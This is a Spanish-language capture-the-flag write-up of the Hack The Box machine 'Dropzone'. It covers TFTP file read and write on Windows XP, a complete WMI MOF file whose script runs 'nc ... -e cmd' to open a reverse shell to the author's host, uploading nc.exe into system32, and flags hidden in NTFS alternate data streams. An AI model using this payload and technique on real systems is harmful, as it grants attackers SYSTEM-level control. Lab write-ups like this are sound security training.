---
layout: single
title: Dropzone - Hack The Box
excerpt: "Dropzone es una máquina con sistema operativo Windows XP, caracterizada por su control de permisos limitado en la interacción del usuario. Este control limitado permite llevar a cabo operaciones de transferencia de archivos a través del protocolo TFTP (GET y PUT) sin imponer restricciones severas. Esta configuración especial habilita la carga de archivos MOF, lo que a su vez posibilita la interacción con WMI y la ejecución de scripts con privilegios del sistema. Además, permite generar payloads de reverseshell hacia nuestro propio host, una táctica que recuerda a la utilizada previamente por el malware Stuxnet. Al final del recorrido, se plantea un desafiante ejercicio de descubrimiento de flujos de datos en el sistema de archivos NTFS."
date: 2023-09-29
classes: wide
header:
  teaser: /assets/images/htb-writeup-dropzone/dropzone_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - Network
  - Vulnerability Assessment
tags:
  - Remote Code Execution
  - Outdated Software 
  - Arbitrary File Upload
  - Weak Permissions 
---
![](/assets/images/htb-writeup-dropzone/dropzone_logo.png)


"Dropzone es una máquina con sistema operativo Windows XP, caracterizada por su control de permisos limitado en la interacción del usuario. Este control limitado permite llevar a cabo operaciones de transferencia de archivos a través del protocolo TFTP (GET y PUT) sin imponer restricciones severas. Esta configuración especial habilita la carga de archivos MOF, lo que a su vez posibilita la interacción con WMI y la ejecución de scripts con privilegios del sistema. Además, permite generar payloads de reverseshell hacia nuestro propio host, una táctica que recuerda a la utilizada previamente por el malware Stuxnet. Al final del recorrido, se plantea un desafiante ejercicio de descubrimiento de flujos de datos en el sistema de archivos NTFS."

## <span style="color: yellow;">Enumeración</span>

#### <span style="color: gray;">Nmap</span>
```
┌─[ot3ro@parrot]─[~/HTB/Dropzone]
└──╼ $sudo nmap -sU 10.10.10.90 -F

Starting Nmap 7.93 ( https://nmap.org ) at 2023-10-01 16:50 CST
Nmap scan report for 10.10.10.90
Host is up (0.17s latency).
Not shown: 99 open|filtered udp ports (no-response)
PORT   STATE SERVICE
69/udp open  tftp

Nmap done: 1 IP address (1 host up) scanned in 18.29 seconds
```
En un principio Nmap no nos muestra puertos TCP abiertos, en cambio Nmap muestra un servicio UDP abierto.

```
┌─[ot3ro@parrot]─[~/HTB/Dropzone]
└──╼ $sudo nmap -sU -sV 10.10.10.90 -p69 -Pn -n --script tftp-enum
Starting Nmap 7.93 ( https://nmap.org ) at 2023-10-01 17:04 CST
Nmap scan report for 10.10.10.90
Host is up (0.16s latency).

PORT   STATE SERVICE VERSION
69/udp open  tftp    SolarWinds Free tftpd
| tftp-enum: 
|_  boot.ini

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 82.40 seconds

```
El servicio TFTP está identificado como "SolarWinds Free tftpd". Además, el escaneo ha revelado que existe un archivo llamado "boot.ini" en el servidor TFTP, que es un archivo de configuración relacionado con el sistema de arranque en sistemas Windows más antiguos, como Windows XP.
De igual manera El servidor TFTP no maneja adecuadamente las entradas proporcionadas por el usuario. Debido a un manejo insuficiente de las entradas del usuario, es posible que un usuario remoto solicite archivos arbitrarios desde el servidor vulnerable.

```
┌─[ot3ro@parrot]─[~/HTB/Dropzone]
└──╼ $tftp
tftp> connect 10.10.10.90
tftp> get \\boot.ini
Received 211 bytes in 0.2 seconds
tftp> quit 

┌─[ot3ro@parrot]─[~/HTB/Dropzone]
└──╼ $ls
'\\boot.ini'

┌─[ot3ro@parrot]─[~/HTB/Dropzone]
└──╼ $cat \\\\boot.ini 
[boot loader]
timeout=30
default=multi(0)disk(0)rdisk(0)partition(1)\WINDOWS
[operating systems]
multi(0)disk(0)rdisk(0)partition(1)\WINDOWS="Microsoft Windows XP Professional" /noexecute=optin /fastdetect

```
La configuración del archivo 'boot.ini' que se nos muestra, es típica de un sistema con Windows XP Professional instalado como único sistema operativo.

```
tftp> get \Windows\system32\eula.txt eula.txt
Received 41543 bytes in 12.9 seconds


┌─[ot3ro@parrot]─[~/HTB/Dropzone]
└──╼ $head eula.txt 
END-USER LICENSE AGREEMENT FOR MICROSOFT 
SOFTWARE

MICROSOFT WINDOWS XP PROFESSIONAL EDITION 
SERVICE PACK 3

```
Revisando el archivo eula (End User License Agreement) podemos corroborar la version del SO como Windows XP SP3, una versión ya descontinuada.

Otra cosa importante a observar, es que tenemos permisos de lectura y escritura en el sistema y no tenemos restringido el acceso al directorio 'system32' entre otros.

## <span style="color: yellow;">Explotación de WMI</span>


Luego de hacer una investigación a profundidad, Encontré un vector de ataque en el que es posible ejecutar archivos MOF a través de WMI(Windows Management Instrumentation) con privilegios de SYSTEM.

La inspiración para este tipo de ataque proviene del malware conocido como __'Stuxnet'__ , específicamente en la variante que se detalla en el boletín de seguridad [ms10-061](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2010/ms10-061){:target="_blank"} de Microsoft. Este boletín se refiere a una de las tácticas empleadas por 'Stuxnet', que explotaba una vulnerabilidad en el servicio 'Windows Spooler' en sistemas Windows.

![](/assets/images/htb-writeup-dropzone/broadcom.png) 
[fuente-broadcom.pdf](https://docs.broadcom.com/doc/security-response-w32-stuxnet-dossier-11-en){:target="_blank"}

Te invito encarecidamente a que dediques un momento para leer el sig. artículo detallado que proporciona una explicación completa de lo mencionado anteriormente:[poppopret.blogspot](http://poppopret.blogspot.com/2011/09/playing-with-mof-files-on-windows-for.html){:target="_blank"}


### <span style="color: orange;">Contexto</span>

En el contexto de WMI, un 'consumidor' y un 'proveedor' son roles específicos desempeñados por diferentes componentes de software.


<span style="color: blue;">Consumidor (Consumer):</span>

__Definición:__ Un consumidor en WMI es una entidad o aplicación que utiliza la información o los servicios proporcionados por los proveedores de WMI.

__Ejemplo:__ Una aplicación que consulta información sobre el estado del sistema, como la cantidad de memoria RAM disponible, es un consumidor de datos de WMI.

<span style="color: blue;">Proveedor (Provider):</span>

__Definición:__ Un proveedor en WMI es una entidad o componente que ofrece acceso a información o funcionalidad específica de un recurso o sistema. Los proveedores permiten que los consumidores obtengan datos o realicen acciones en esos recursos.

__Ejemplo:__ Un proveedor de WMI puede proporcionar información sobre el hardware de una computadora, como la lista de discos duros y su capacidad.
Una vez que tus alumnos comprendan estas definiciones básicas, puedes introducir la relación con los archivos MOF:

<span style="color: orange;">Archivo</span> [MOF](https://learn.microsoft.com/en-us/windows/win32/wmisdk/managed-object-format--mof-?redirectedfrom=MSDN){:target="_blank"}:

__Definición:__ Un archivo MOF (Managed Object Format) es un archivo de texto que define la estructura y la información que un proveedor de WMI pone a disposición de los consumidores. Contiene las descripciones de las clases, propiedades y métodos que el proveedor ofrece para que los consumidores puedan acceder a los recursos o configurar el sistema.

__Relación con Consumidores y Proveedores:__ Los archivos MOF son utilizados por los proveedores de WMI para especificar qué información o funcionalidad están dispuestos a proporcionar a los consumidores. Los consumidores pueden utilizar estas definiciones MOF para comprender cómo interactuar con los recursos gestionados por WMI.

[recurso-blackhat-wmi.pdf](https://www.blackhat.com/docs/us-15/materials/us-15-Graeber-Abusing-Windows-Management-Instrumentation-WMI-To-Build-A-Persistent%20Asynchronous-And-Fileless-Backdoor-wp.pdf){:target="_blank"}

## <span style="color: yellow;">Explotación</span>


### <span style="color: orange;">Creación del archivo MOF</span>


Metasploit incluye un módulo de explotación denominado [webexec.rb](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/smb/webexec.rb){:target="_blank"}, el cual podemos utilizar como punto de partida para la creación de nuestro propio archivo MOF.
><p style="font-size: 16px;">NOTA: Es indispensable modificar el exploit y ajustarlo a tus necesidades.</p>

#### <span style="color: gray;">MOF file</span>
```ruby
  GNU nano 5.4                                                                                                                       rever.mof                                                                                                                         I      
#pragma namespace("\\\\.\\root\\cimv2")
class MyClass7910
{
        [key] string Name;
};
class ActiveScriptEventConsumer : __EventConsumer
{
        [key] string Name;
        [not_null] string ScriptingEngine;
        string ScriptFileName;
        [template] string ScriptText;
  uint32 KillTimeout;
};
instance of __Win32Provider as $P
{
    Name  = "ActiveScriptEventConsumer";
    CLSID = "{266c72e7-62e8-11d1-ad89-00c04fd8fdff}";
    PerUserInitialization = TRUE;
};
instance of __EventConsumerProviderRegistration
{
  Provider = $P;
  ConsumerClassNames = {"ActiveScriptEventConsumer"};
};
Instance of ActiveScriptEventConsumer as $cons
{
  Name = "ASEC";
  ScriptingEngine = "JScript";
  ScriptText = "\ntry {var s = new ActiveXObject(\"Wscript.Shell\");\ns.Run(\"nc 10.10.14.9 1337 -e cmd\");} catch (err) {};\nsv = GetObject(\"winmgmts:root\\\\cimv2\");try {sv.Delete(\"MyClass7910\");} catch (err) {};try {sv.Delete(\"__EventFilter.Name='instfilt'\");}>

};

instance of __EventFilter as $Filt
{
  Name = "instfilt";
  Query = "SELECT * FROM __InstanceCreationEvent WHERE TargetInstance.__class = \"MyClass7910\"";
  QueryLanguage = "WQL";
};

instance of __FilterToConsumerBinding as $bind
{
  Consumer = $cons;
  Filter = $Filt;
};

instance of MyClass7910 as $MyClass
{
  Name = "ClassConsumer";
};

```
A continuación daré una breve explicación de cada elemento dentro del archivo MOF en orden de aparición:

1. <p style="font-size: 16px;">Primero se define una clase <span style="color: blue">"MyClass7910"</span>, La función principal de esta clase es implementar un evento basado en scripts que se activa cuando se crea una instancia de la misma y <strong>ejecuta</strong> un script de <strong>JScript</strong> que  <strong>realiza ciertas acciones</strong></p>

2. <p style="font-size: 16px;">La clase <span style="color: blue;">"ActiveScriptEventConsumer"</span> está diseñada para <strong>ejecutar</strong> un <strong>script</strong> en respuesta a un <strong>evento</strong>. En este caso, el script a ejecutar se especifica en la propiedad <span style="color: gray;">'ScriptText'</span> que contiene el texto del script(nuestro payload) que se ejecutará en respuesta a el evento</p>

3. <p style="font-size: 16px;">La línea <span style="color: blue;">"instance of __Win32Provider as $P"</span> crea una instancia de un <strong>proveedor</strong> de administración de Windows y la asigna a la variable "$P." </p>

4. <p style="font-size: 16px;">Se crea la instancia de la clase <span style="color: blue;">"__EventConsumerProviderRegistration"</span>.</p>

5. <p style="font-size: 16px;">Se crea la Instancia de la clase<span style="color: blue;">"ActiveScriptEventConsumer"</span>.</p>

6. <p style="font-size: 16px;">Se crea la instancia de la clase <span style="color: blue;">"__EventFilter"</span> llamada "$Filt" que se utiliza como un filtro de eventos. Esta instancia de filtro está configurada para capturar eventos de creación de instancias de la clase "MyClass7910" en el sistema. Cuando se produzca un evento de creación de una instancia de "MyClass7910," este filtro capturará ese evento específico y lo procesará según lo configurado en el código.</p>

7. <p style="font-size: 16px;">La instancia <span style="color: blue;">"__FilterToConsumerBinding"</span> se utiliza para establecer una relación entre un filtro de eventos y un <strong>consumidor</strong> de eventos específicos.</p>

8. <p style="font-size: 16px;">En la última línea se crea la instancia de la clase <span style="color: blue;">"MyClass7910"</span> llamada "$MyClass". La creación de esta instancia es lo que desencadenará el evento especificado en <span style="color: gray;">"__EventFilter"</span> y en respuesta el <strong>consumidor</strong> <span style="color: gray;">"ActiveScriptEventConsumer"</span> ejecutará el script dentro de la variable <span style="color: gray;">'ScriptText'</span>.</p>


Antes de cargar nuestro archivo MOF, vamos a transferir el "nc.exe" en el directorio "system32" y ponernos en escucha con 'nc'.
><p style="font-size: 16px;">NOTA: es importante establecer el modo binario en el servidor TFTP para que nuestro ejecutable no se corrompa.</p>

```
┌─[ot3ro@parrot]─[~/HTB/Dropzone]
└──╼ $tftp

tftp> connect 10.10.10.90
tftp> binary
tftp> status
Connected to 10.10.10.90.
Mode: octet Verbose: off Tracing: off
Rexmt-interval: 5 seconds, Max-timeout: 25 seconds
tftp> put nc.exe \\windows\system32\nc.exe
Sent 28160 bytes in 9.0 seconds

```
#### <span style="color: gray;">Carga del archivo MOF</span>
```
┌─[ot3ro@parrot]─[~/HTB/Dropzone/MOF]
└──╼ $tftp
tftp> connect 10.10.10.90
tftp> put rever.mof \Windows\system32\wbem\mof\rever.mof                         
Sent 1690 bytes in 0.9 seconds
tftp> 
```
```
┌─[ot3ro@parrot]─[~/HTB/Dropzone]
└──╼ $sudo nc -lnvp 1337
listening on [any] 1337 ...
connect to [10.10.14.9] from (UNKNOWN) [10.10.10.90] 1086
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\WINDOWS\system32>

```
Logramos conseguir acceso al sistema.

```
C:\>cd \
C:\>tree /f /a
Folder PATH listing
Volume serial number is 00200064 7CF6:55F6
C:.
+---Administrator
|   +---Desktop
|   |   |   root.txt
|   |   |   
|   |   \---flags
|   |           2 for the price of 1!.txt
|   |           

...[SNIP]...

```
```
C:\cd Documents and Settings\Administrator\Desktop
C:\Documents and Settings\Administrator\Desktop>type root.txt
It's easy, but not THAT easy...

C:\Documents and Settings\Administrator\Desktop>cd flags
C:\Documents and Settings\Administrator\Desktop\flags>type "2 for the price of 1!.txt"

For limited time only!

Keep an eye on our ADS for new offers & discounts!

```
El contenido del archivo "2 for the price of 1!.txt" incluye un mensaje que dice: "Esté atento a nuestras ADS para conocer nuevas ofertas y descuentos". Este mensaje podría parecer enigmático, ya que hace referencia a las siglas "ADS", que se asocian con "Alternate Data Streams" o, en español, "flujos de datos alternativos"
><p style="font-size: 16px;">Los flujos de datos alternativos (ADS) en Windows son, en esencia, archivos ocultos que pueden considerarse como "metadatos" asociados a un archivo principal. Estos flujos de datos alternativos representan una característica del sistema de archivos NTFS (New Technology File System) de Windows que posibilita la inclusión de información adicional en un archivo existente sin alterar el contenido original.</p>

Primero debemos descargar el ejecutable de [streams.exe](https://learn.microsoft.com/en-us/sysinternals/downloads/streams), una utilidad de Systernals que permite ver y manipular atributos de datos alternativos (ADS).

Yo me transferí el ejecutable por medio de smbserver.

```
┌─[ot3ro@parrot]─[~/Downloads]
└──╼ $sudo impacket-smbserver share -smb2support $(pwd)

...[SNIP]...

[-] SMB2_NEGOTIATE: SMB2 not supported, fallbacking
[*] AUTHENTICATE_MESSAGE (\,DROPZONE)
[*] User DROPZONE\ authenticated successfully
[*] :::00::aaaaaaaaaaaaaaaa
[-] Unknown level for query path info! 0x109
[*] Disconnecting Share(1:IPC$)
[*] Closing down connection (10.10.10.90,1041)
[*] Remaining connections []

```
```
C:\Documents and Settings\Administrator\Desktop\flags>copy \\10.10.14.9\share\streams.exe

        1 file(s) copied.
```

```
C:\Documents and Settings\Administrator\Desktop\flags>streams.exe "2 for the price of 1!.txt"


��
streams v1.60 - Reveal NTFS alternate streams.
Copyright (C) 2005-2016 Mark Russinovich
Sysinternals - www.sysinternals.com

SYSINTERNALS SOFTWARE LICENSE TERMS

...[SNIP]...

```
antes de continuar, la herramienta te presenta el Acuerdo de Licencia de Usuario Final (EULA) y te solicita que lo aceptes para continuar.

```
C:\Documents and Settings\Administrator\Desktop\flags>streams.exe -accepteula "2 for the price of 1!.txt"


streams v1.60 - Reveal NTFS alternate streams.
Copyright (C) 2005-2016 Mark Russinovich
Sysinternals - www.sysinternals.com

   :root_txt_3316ffe05fada8f8e651931a5c45edab:$DATA	5
   :user_txt_a6a4830ddd27a1bddd59d2aaa80f7940:$DATA	5

```
Y por fin logramos conseguir las flags de user.txt y root.txt




